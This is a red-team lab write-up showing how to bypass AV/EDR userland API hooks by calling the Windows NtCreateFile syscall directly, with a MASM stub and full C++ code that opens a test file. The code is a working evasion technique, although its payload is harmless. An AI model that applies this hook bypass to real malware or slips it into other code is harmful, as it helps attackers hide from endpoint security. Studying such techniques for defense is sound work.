# Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs

## Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs

AVs/EDR solutions usually hook userland Windows APIs in order to decide if the code that is being executed is malicious or not. It's possible to bypass hooked functions by writing your own functions that call syscalls directly.

For a more detailed explanation of the above, read a great research done by [@Cn33liz](https://twitter.com/Cneelis) from [@Outflank](https://twitter.com/OutflankNL): [https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/) - now you know what inspired me to do this lab.

With this lab, I wanted to follow along what Cn33liz did and go through the process of incorporating and compiling ASM code from the Visual Studio and simply invoking one syscall to see how it's all done by myself. In this case, I will be playing with `NtCreateFile` syscall as this will be enough to prove the concept.

Also, see my previous labs about API hooking/unhooking: [Windows API Hooking,](../code-and-process-injection/windows-api-hooking.md) [Bypassing Cylance ](bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis.md)and other AVs/EDRs by Unhooking Windows APIs

### Setting Up Project Environment

Add a new file to the project, say `syscalls.asm` - make sure the main cpp file has a different name as the project will not compile:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjAqJPrVK--o5vqKZl_%2F-LjArc3FHP4Bp0ltWUOF%2Fimage.png?alt=media\&token=5ff75d70-bcdb-4451-9082-b07ab0e4b6e2)

Navigate to project's `Build Customizations`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjAqJPrVK--o5vqKZl_%2F-LjBZIlBFPLR4UN-jdL5%2Fimage.png?alt=media\&token=fe38d794-7ef3-429f-946d-097bee5f8565)

Enable `masm`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjAqJPrVK--o5vqKZl_%2F-LjAypSnABoamJA5qtKP%2Fimage.png?alt=media\&token=c3e845dc-f3f0-484b-b9cd-173e5b92c970)

Configure the `syscalls.asm` file to be part of the project and compiled using Microsoft Macro Assembler:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjAqJPrVK--o5vqKZl_%2F-LjBZcR2cOj3bna9xZac%2Fimage.png?alt=media\&token=59316efd-8f34-4808-b60f-43d2fb36f4b2)

### Defining Syscalls

In the `syscalls.asm`, let's define a procedure `SysNtCreateFile` with a syscall number 55 that is reserved for `NtCreateFile` in [Windows 10](https://j00ru.vexillium.org/syscalls/nt/64/):

{% code title="syscalls.asm" %}
```csharp
.code
	SysNtCreateFile proc
			mov r10, rcx
			mov eax, 55h
			syscall
			ret
	SysNtCreateFile endp
end
```
{% endcode %}

The way we can find the procedure's prologue (mov r10, rcx, etc..) is by disassembling the function `NtCreateFile` (assuming it's not hooked. If hooked, just do the same for, say `NtWriteFile`) using WinDbg found in `ntdll.dll` module or within Visual Studio by resolving the function's address and viewing its disassembly there:

```cpp
FARPROC addr = GetProcAddress(LoadLibraryA("ntdll"), "NtCreateFile");
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjB_qkyhCQvQXmTWkaq%2F-LjBbmzimlPcrRQgsuBT%2Fimage.png?alt=media\&token=a250b915-a7e2-4760-8183-d576f1482b3d)

Disassembling the address of the `NtCreateFile` in `ntdll` - note the highlighted instructions and we can skip the `test` / `jne` instructions at this point as they are irrelevant for this exercise:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjB_qkyhCQvQXmTWkaq%2F-LjBbx9pxN_2vbFOEkEZ%2Fimage.png?alt=media\&token=95617a95-5298-48cf-a2de-f2dcfe881df5)

### Declaring the Calling C Function

Once we have the `SysNtCreateFile` procedure defined in assembly, we need to define the C function prototype that will call that assembly procedure. The `NtCreateFile` prototype per [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile) is:

```cpp
// Using the NtCreateFile prototype to define a prototype for SysNtCreateFile. 
// The prorotype name needs to match the procedure name defined in the syscalls.asm
// EXTERN_C tells the compiler to link this function as a C function and use stdcall 
// calling convention - Important!

EXTERN_C NTSTATUS SysNtCreateFile(
	PHANDLE FileHandle, 
	ACCESS_MASK DesiredAccess, 
	POBJECT_ATTRIBUTES ObjectAttributes, 
	PIO_STATUS_BLOCK IoStatusBlock, 
	PLARGE_INTEGER AllocationSize, 
	ULONG FileAttributes, 
	ULONG ShareAccess, 
	ULONG CreateDisposition, 
	ULONG CreateOptions, 
	PVOID EaBuffer, 
	ULONG EaLength
);
```

Once we have the prototype, we can compile the code and check if the `SysNtCreateFile` function can now be found in the process memory by entering the function's name in Visual Studio disassembly panel:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjB_qkyhCQvQXmTWkaq%2F-LjBd_DMd_yudyBgGuWB%2Fimage.png?alt=media\&token=dee1844a-d4b1-4ff9-b234-06b2af94cea2)

The above indicates that assembly instructions were compiled into the binary successfully and once executed, they will issue a syscall `0x55` that is normally called by `NtCreateFile` from within ntdll.

### Initializing Variables and Structures

Before testing `SysNtCreateFile`, we need to initialize some structures and variables (like the name of the file name to be opened, access requirements, etc.) required by the `NtCreateFile`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjB_qkyhCQvQXmTWkaq%2F-LjBeB7V-PtWxmKUSdwo%2Fimage.png?alt=media\&token=6cae38da-10f6-4375-87dd-fa9553be721b)

### Invoking the Syscall

Once the variables and structures are initialized, we are ready to invoke the `SysNtCreateFile`:

```cpp
SysNtCreateFile(
	&fileHandle, 
	FILE_GENERIC_WRITE, 
	&oa, 
	&osb, 
	0, 
	FILE_ATTRIBUTE_NORMAL, 
	FILE_SHARE_WRITE, 
	FILE_OVERWRITE_IF, 
	FILE_SYNCHRONOUS_IO_NONALERT, 
	NULL, 
	0
);
```

If we go into debug mode, we can see that all the arguments required by the `SysNtCreateFile` are being pushed on to the stack - as seen on the right disassembler panel where the break point on `SysNtCreateFile` is set:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjB_qkyhCQvQXmTWkaq%2F-LjBgEfj9hapb_G_hQm8%2Fimage.png?alt=media\&token=ba8aab2e-113c-433f-9490-03d371794790)

If we continue debugging, the debugger eventually steps in to our assembly code that defines the `SysNtCreateFile` procedure and issues the syscall for `NtCreateFile`. Once the syscall finishes executing, a handle to the opened file `c:\temp\test.txt` is returned to the variable `fileHandle`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LjB_qkyhCQvQXmTWkaq%2F-LjBgbyzlmx2SIrGuGIk%2Fsyscall-debugging.gif?alt=media\&token=a66279aa-f0d6-426c-bfeb-c95c8896aabb)

### So What?

What this all means is that if an AV/EDR product had hooked `NtCreateFile` API call, and was blocking any access to the file c:\temp\test.txt as part of the hooked routine, we would have bypassed that restriction since we did not call the `NtCreateFile` API, but called its syscall directly instead by invoking `SysNtCreateFile` - the AV/EDR would not have intercepted our attempt to open the file and we would have opened it successfully.

### Code

{% code title="syscalls.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include "winternl.h"
#pragma comment(lib, "ntdll")

EXTERN_C NTSTATUS SysNtCreateFile(
	PHANDLE FileHandle, 
	ACCESS_MASK DesiredAccess, 
	POBJECT_ATTRIBUTES ObjectAttributes, 
	PIO_STATUS_BLOCK IoStatusBlock, 
	PLARGE_INTEGER AllocationSize, 
	ULONG FileAttributes, 
	ULONG ShareAccess, 
	ULONG CreateDisposition, 
	ULONG CreateOptions, 
	PVOID EaBuffer, 
	ULONG EaLength);

int main()
{
	FARPROC addr = GetProcAddress(LoadLibraryA("ntdll"), "NtCreateFile");
	
	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = NULL;
	UNICODE_STRING fileName;
	IO_STATUS_BLOCK osb;

	RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\temp\\test.txt");
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	SysNtCreateFile(
		&fileHandle, 
		FILE_GENERIC_WRITE, 
		&oa, 
		&osb, 
		0, 
		FILE_ATTRIBUTE_NORMAL, 
		FILE_SHARE_WRITE, 
		FILE_OVERWRITE_IF, 
		FILE_SYNCHRONOUS_IO_NONALERT, 
		NULL, 
		0);

	return 0;
}
```
{% endcode %}

### References

{% embed url="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" %}

{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile" %}

{% embed url="https://j00ru.vexillium.org/syscalls/nt/64/" %}
